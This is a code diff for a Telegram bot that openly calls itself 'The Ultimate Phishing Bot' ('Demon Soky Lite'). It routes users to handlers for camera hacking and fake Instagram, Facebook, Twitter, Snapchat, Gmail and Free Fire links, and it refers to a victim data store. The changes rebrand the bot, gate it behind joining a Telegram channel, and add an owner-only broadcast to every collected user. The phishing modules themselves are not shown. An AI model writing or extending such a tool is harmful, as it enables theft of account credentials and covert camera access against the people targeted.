@@ -3,7 +3,7 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMar
 import time
 import threading
 import requests
-from bot.config import BOT_TOKEN
+from bot.config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL
 from bot.buttons import (
     handle_cam_hack,
     handle_insta_button, handle_insta_callback,
@@ -19,25 +19,26 @@ from bot.utils.storage import link_cache, victim_data_store
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
+# ========== OWNER ID (SIRF TU) ==========
+OWNER_ID = 7993444324  # <-- APNI TELEGRAM ID DAAL
+
+# ========== BROADCAST STATE ==========
+broadcast_mode = False
+active_users = set()
+
 # ========== CHECK IF USER JOINED CHANNEL ==========
 def check_user_joined(user_id):
-    """Check if user has joined @nr_hackz"""
     try:
-        # Get chat member status
-        chat_member = bot.get_chat_member("@nr_hackz", user_id)
+        chat_member = bot.get_chat_member("@nrtecno2", user_id)
         status = chat_member.status
-        # If status is 'left' or 'kicked', user hasn't joined
         if status in ['left', 'kicked']:
             return False
-        # 'member', 'creator', 'administrator', 'restricted' means joined
         return True
     except Exception as e:
         print(f"Check join error: {e}")
-        # If can't check, assume they haven't joined
         return False
 
 # ========== BOTTOM BUTTONS ==========
-
 def get_bottom_buttons():
     markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     markup.add(
@@ -52,48 +53,96 @@ def get_bottom_buttons():
     )
     return markup
 
-# ========== JOIN & VERIFY BUTTONS ==========
-
+# ========== JOIN BUTTONS ==========
 def get_join_buttons():
     markup = InlineKeyboardMarkup(row_width=1)
     markup.add(
-        InlineKeyboardButton("📢 Join @nr_hackz", url="https://t.me/nr_hackz"),
+        InlineKeyboardButton("📢 Join @nrtecno2", url="https://t.me/nrtecno2"),
         InlineKeyboardButton("✅ I have joined", callback_data="verify_join")
     )
     return markup
 
-# ========== /START ==========
+# ========== /HUKUM COMMAND (OWNER ONLY) ==========
+@bot.message_handler(commands=['hukum'])
+def hukum_command(message):
+    user_id = message.chat.id
 
+    if user_id != OWNER_ID:
+        bot.reply_to(message, "❌ Ye command sirf owner ke liye hai.")
+        return
+
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("🟢 ON", callback_data="broadcast_on"),
+        InlineKeyboardButton("🔴 OFF", callback_data="broadcast_off")
+    )
+
+    bot.send_message(
+        user_id,
+        "⚙️ *Broadcast Control*\n\n"
+        "🟢 ON — Start broadcast\n"
+        "🔴 OFF — Stop broadcast\n\n"
+        "Current status: " + ("🟢 ON" if broadcast_mode else "🔴 OFF"),
+        reply_markup=markup,
+        parse_mode="Markdown"
+    )
+
+# ========== BROADCAST CALLBACK ==========
+@bot.callback_query_handler(func=lambda call: call.data in ["broadcast_on", "broadcast_off"])
+def broadcast_callback(call):
+    global broadcast_mode
+    user_id = call.from_user.id
+
+    if user_id != OWNER_ID:
+        bot.answer_callback_query(call.id, "❌ Ye sirf owner ke liye hai.")
+        return
+
+    if call.data == "broadcast_on":
+        broadcast_mode = True
+        bot.answer_callback_query(call.id, "🟢 Broadcast ON")
+        bot.send_message(
+            user_id,
+            "🟢 *Broadcast ON*\n\n"
+            "Ab tu jo bhi message bhejega, woh saare active users ko chala jayega.\n\n"
+            "Band karne ke liye /hukum → OFF dabana.",
+            parse_mode="Markdown"
+        )
+    elif call.data == "broadcast_off":
+        broadcast_mode = False
+        bot.answer_callback_query(call.id, "🔴 Broadcast OFF")
+        bot.send_message(
+            user_id,
+            "🔴 *Broadcast OFF*\n\nAb bot normal chalega.",
+            parse_mode="Markdown"
+        )
+
+# ========== /START ==========
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.chat.id
+    active_users.add(user_id)
 
-    # Check if user has joined the channel
     if check_user_joined(user_id):
-        # User has joined → show main menu
         show_main_menu(message)
         return
     else:
-        # User hasn't joined → show join & verify buttons
         bot.send_message(
             user_id,
             "🔐 *Access Restricted*\n\n"
-            "You must join @nr_hackz to use this bot.\n\n"
-            "👉 [Join @nrtecno2](https://t.me/nr_hackz)\n\n"
+            "You must join @nrtecno2 to use this bot.\n\n"
+            "👉 [Join @nrtecno2](https://t.me/nrtecno2)\n\n"
             "After joining, click the button below to verify.",
             reply_markup=get_join_buttons(),
             parse_mode="Markdown"
         )
 
 # ========== VERIFY CALLBACK ==========
-
 @bot.callback_query_handler(func=lambda call: call.data == "verify_join")
 def verify_join(call):
     user_id = call.from_user.id
 
-    # Check again if user joined
     if check_user_joined(user_id):
-        bot.answer_callback_query(call.id, "✅ Verified! You can now use the bot.")
+        bot.answer_callback_query(call.id, "✅ Verified!")
         bot.send_message(
             user_id,
             "✅ *Welcome!*\n\nYou can now use all features.",
@@ -102,18 +151,17 @@ def verify_join(call):
         )
     else:
         bot.answer_callback_query(
-            call.id, 
-            "❌ You haven't joined @nr_hackz yet!\nPlease join first using the button above.",
+            call.id,
+            "❌ You haven't joined @nrtecno2 yet! Please join first.",
             show_alert=True
         )
 
 # ========== MAIN MENU ==========
-
 def show_main_menu(message):
     user_id = message.chat.id
     bot.send_message(
         user_id,
-        "🔥 *NRTECNO2* 🔥\n"
+        "🔥 *DEMON SOKY LITE* 🔥\n"
         "╔═══════════════════════════════╗\n"
         "║  ⚡ The Ultimate Phishing Bot ⚡  ║\n"
         "╚═══════════════════════════════╝\n\n"
@@ -138,13 +186,42 @@ def show_main_menu(message):
     )
 
 # ========== ROUTING ==========
-
 @bot.message_handler(func=lambda message: True)
 def route_buttons(message):
+    global broadcast_mode
     text = message.text
     user_id = message.chat.id
 
-    # Check if user joined before any action
+    active_users.add(user_id)
+
+    # ===== BROADCAST MODE (OWNER ONLY) =====
+    if broadcast_mode and user_id == OWNER_ID:
+        if text and text.startswith('/'):
+            return
+
+        success_count = 0
+        fail_count = 0
+
+        for uid in list(active_users):
+            try:
+                bot.send_message(uid, text)
+                success_count += 1
+            except Exception as e:
+                fail_count += 1
+                if "blocked" in str(e).lower() or "chat not found" in str(e).lower():
+                    active_users.discard(uid)
+
+        bot.send_message(
+            OWNER_ID,
+            f"📢 *Broadcast Complete*\n\n"
+            f"✅ Sent: {success_count}\n"
+            f"❌ Failed: {fail_count}\n"
+            f"👥 Total Users: {len(active_users)}",
+            parse_mode="Markdown"
+        )
+        return
+
+    # ===== NORMAL ROUTING =====
     if not check_user_joined(user_id):
         bot.send_message(
             user_id,
@@ -170,61 +247,47 @@ def route_buttons(message):
     elif text == "🔗 All Links":
         handle_all_links(bot, message, get_bottom_buttons)
     else:
+        if user_id == OWNER_ID:
+            return
         bot.send_message(user_id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())
 
 # ========== INLINE CALLBACKS ==========
-
 @bot.callback_query_handler(func=lambda call: True)
 def handle_inline(call):
     data = call.data
 
-    # Instagram callbacks
+    if data in ["broadcast_on", "broadcast_off"]:
+        return
+
     if data in ["ig_copy", "ig_back", "ig_menu"]:
         handle_insta_callback(bot, call)
         return
-
-    # Facebook callbacks
     if data in ["face_copy", "face_back", "face_menu"]:
         handle_face_callback(bot, call)
         return
-
-    # Twitter callbacks
     if data in ["twit_copy", "twit_back", "twit_menu"]:
         handle_twit_callback(bot, call)
         return
-
-    # Snapchat callbacks
     if data in ["snap_copy", "snap_back", "snap_menu"]:
         handle_snap_callback(bot, call)
         return
-
-    # Gmail callbacks
     if data in ["gmail_copy", "gmail_back", "gmail_menu"]:
         handle_gmail_callback(bot, call)
         return
-
-    # Free Fire callbacks
     if data in ["free_copy", "free_back", "free_menu"]:
         handle_freefire_callback(bot, call)
         return
-
-    # All Links callbacks
     if data == "copy_all":
         handle_copy_all(bot, call)
         return
-
-    # Generic copy
     if data == "copy":
         bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")
         return
-
-    # Verify join (already handled above, but keep for safety)
     if data == "verify_join":
         verify_join(call)
         return
 
 # ========== RUN BOT ==========
-
 def run_bot():
     while True:
         try:
@@ -234,6 +297,6 @@ def run_bot():
             time.sleep(5)
 
 if __name__ == "__main__":
-    print("🤖 Bot Running... All 8 buttons working!")
+    print("🤖 Demon Soky Lite Bot Running...")
     threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=5000, debug=False)
